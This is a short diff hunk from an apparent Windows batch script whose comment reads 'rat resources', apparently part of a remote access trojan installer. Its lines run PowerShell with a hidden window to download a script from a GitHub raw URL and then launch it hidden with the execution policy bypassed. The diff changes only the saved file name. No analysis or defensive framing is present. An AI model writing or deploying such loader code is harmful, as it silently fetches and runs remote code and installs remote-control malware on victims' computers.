@@ -33,6 +33,6 @@ start powershell
 
 REM rat resources
 
-powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Installer.ps1' -OutFile 'install.ps1'"
+powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Installer.ps1' -OutFile 'installer.ps1'"
 powershell Start-Process -windowstyle hidden -ep bypass "Installer.ps1"
 
